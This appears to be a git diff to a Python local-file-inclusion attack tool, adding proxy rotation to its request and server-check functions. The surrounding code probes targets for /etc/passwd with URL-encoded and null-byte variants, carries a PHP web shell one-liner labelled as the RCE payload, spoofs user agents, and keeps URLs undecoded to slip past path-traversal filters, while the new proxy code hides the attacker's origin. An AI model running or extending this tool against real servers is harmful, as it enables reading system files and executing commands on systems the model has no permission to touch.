@@ -5,11 +5,11 @@ import urllib
 from urllib.parse import quote
 from urllib.request import urlopen
 from termcolor import colored
-
+from proxies_list import fetch_proxy
 
 class Payload:
 
-	def __init__(self, url, outfile, initiate=True, poc=["%2Fetc%2Fpasswd", "%2Fetc%2Fpasswd%00"], verbosity=1):
+	def __init__(self, url, outfile, initiate=True, poc=["%2Fetc%2Fpasswd", "%2Fetc%2Fpasswd%00"], verbosity=1, proxies=False):
 		self.url = url.strip()
 		self.verbosity = verbosity
 		self.outfile = outfile
@@ -30,6 +30,8 @@ class Payload:
 
 		# payload for RCE
 		self.payload = "<?php system($_GET['cmd']); ?>"
+
+		self.proxies = proxies
 		if initiate:
 			self.Attack()
 
@@ -43,6 +45,10 @@ class Payload:
 			
 	# DON'T touch it, it sends the url as is without decoding it first, so that it can bypass filters that look for ..
 	def hit(self, url):
+		if self.proxies:
+			proxy_support = urllib.request.ProxyHandler(fetch_proxy())
+			opener = urllib.request.build_opener(proxy_support)
+			urllib.request.install_opener(opener)
 		request = urllib.request.Request(url)
 		request.add_header('User-Agent', fetchAgent())
 		response = urlopen(request)
@@ -52,12 +58,19 @@ class Payload:
 	# Checks if the url is valid
 	def urlCheck(self):
 		try:
-			ret = requests.get(self.url, headers=fetchUA())
+			print("Checking Remote Server Health")
+			if self.proxies:
+				ret = requests.get(self.url, headers=fetchUA(), proxies=fetch_proxy())
+			else:
+				ret = requests.get(self.url, headers=fetchUA())
 			if ret.status_code == 200:
+				print(colored(str(ret.status_code) +" - OK",'green'))
 				return True
 			else:
+				print(colored(str(ret.status_code) + " - DEAD", 'red'))
 				return False	
 		except Exception as e:
+			print(colored(str(ret.status_code) + " - DEAD", 'red'))
 			print(colored('[-]', 'red', attrs=['bold']) + ' Something went wrong, ', e)
 			print(colored('[!]', 'yellow', attrs=['bold']) + ' The URL format must be http://[URL]?[something]=')
 			return False
